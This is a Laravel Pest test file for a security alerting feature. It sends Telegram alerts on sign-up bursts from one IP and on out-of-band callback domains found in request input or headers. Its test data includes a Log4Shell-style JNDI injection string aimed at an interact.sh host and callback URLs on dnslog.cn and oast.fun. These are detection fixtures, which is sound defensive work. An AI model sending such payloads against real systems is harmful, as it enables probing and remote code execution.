<?php

use App\Models\Station;
use App\Models\User;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;

use function Pest\Laravel\actingAs;
use function Pest\Laravel\postJson;
use function Pest\Laravel\withServerVariables;

/*
| Telegram alerts for the two tells of the 2026-10-27 probe that Laravel can
| see: several sign-ups from one address, and a callback host in input.
*/

beforeEach(function () {
    config([
        'services.telegram.bot_token' => 'test-token',
        'services.telegram.admin_chat_id' => '42',
    ]);

    Http::fake(['api.telegram.org/*' => Http::response(['ok' => true])]);
});

/** @return list<string> */
function securityAlerts(): array
{
    return Http::recorded()
        ->map(fn (array $pair) => $pair[0])
        ->filter(fn (Request $r) => str_contains($r->url(), 'api.telegram.org'))
        ->map(fn (Request $r) => (string) $r['text'])
        ->filter(fn (string $text) => str_contains($text, '🚨'))
        ->values()
        ->all();
}

function registerFrom(string $ip, string $email): void
{
    withServerVariables(['REMOTE_ADDR' => $ip])->postJson('/api/auth/register', [
        'name' => 'Probe',
        'email' => $email,
        'password' => 'secret-pass-123',
        'password_confirmation' => 'secret-pass-123',
    ])->assertCreated();
}

it('alerts once when one address registers several accounts', function () {
    registerFrom('203.0.113.7', 'a@example.com');
    registerFrom('203.0.113.7', 'b@example.com');

    expect(securityAlerts())->toBeEmpty();

    registerFrom('203.0.113.7', 'c@example.com');
    registerFrom('203.0.113.7', 'd@example.com');

    expect(securityAlerts())->toHaveCount(1)
        ->and(securityAlerts()[0])->toContain('Sign-up burst from one address')
        ->toContain('203.0.113.7')
        ->toContain('c@example.com');
});

it('does not alert for sign-ups from different addresses', function () {
    registerFrom('203.0.113.1', 'a@example.com');
    registerFrom('203.0.113.2', 'b@example.com');
    registerFrom('203.0.113.3', 'c@example.com');

    expect(securityAlerts())->toBeEmpty();
});

it('does not count users created outside a request', function () {
    User::factory()->count(5)->create();

    expect(securityAlerts())->toBeEmpty();
});

it('alerts when a callback domain appears in input, and lets the request through', function () {
    $station = Station::factory()->create();

    actingAs($station->user)
        ->patchJson("/api/stations/{$station->slug}", ['description' => 'see http://a2.squuqb.dnslog.cn/x'])
        ->assertSuccessful();

    expect(securityAlerts())->toHaveCount(1)
        ->and(securityAlerts()[0])->toContain('Callback domain in input')
        ->toContain('description')
        ->toContain('a2.squuqb.dnslog.cn');
});

it('looks inside nested input and the User-Agent header', function () {
    $station = Station::factory()->create();

    actingAs($station->user)
        ->patchJson("/api/stations/{$station->slug}", [
            'social_links' => [['label' => 'x', 'url' => 'https://abc.oast.fun/']],
        ]);

    expect(securityAlerts())->toHaveCount(1)
        ->and(securityAlerts()[0])->toContain('social_links.0.url');

    Http::fake(['api.telegram.org/*' => Http::response(['ok' => true])]);
    Cache::flush();

    $this->withHeader('User-Agent', 'curl ${jndi:ldap://x.interact.sh/a}')->withoutVite()->get('/admin/login');

    expect(securityAlerts())->toHaveCount(1)
        ->and(securityAlerts()[0])->toContain('header:User-Agent');
});

it('does not alert on look-alike text', function () {
    $station = Station::factory()->create();

    actingAs($station->user)
        ->patchJson("/api/stations/{$station->slug}", ['description' => 'our show on mydnslog.cnn.example and webhook.sites'])
        ->assertSuccessful();

    expect(securityAlerts())->toBeEmpty();
});

it('never sends a password field to Telegram', function () {
    postJson('/api/auth/login', ['email' => 'x@example.com', 'password' => 'hunter2.dnslog.cn']);

    expect(securityAlerts())->toBeEmpty();
});

it('throttles repeat alerts from one address', function () {
    $station = Station::factory()->create();

    foreach (range(1, 3) as $i) {
        actingAs($station->user)
            ->patchJson("/api/stations/{$station->slug}", ['description' => "try {$i}.dnslog.cn"]);
    }

    expect(securityAlerts())->toHaveCount(1);
});

it('does not scan webhook payloads', function () {
    postJson('/api/webhooks/resend', ['type' => 'email.received', 'data' => ['subject' => 'see x.dnslog.cn']]);

    expect(securityAlerts())->toBeEmpty();
});
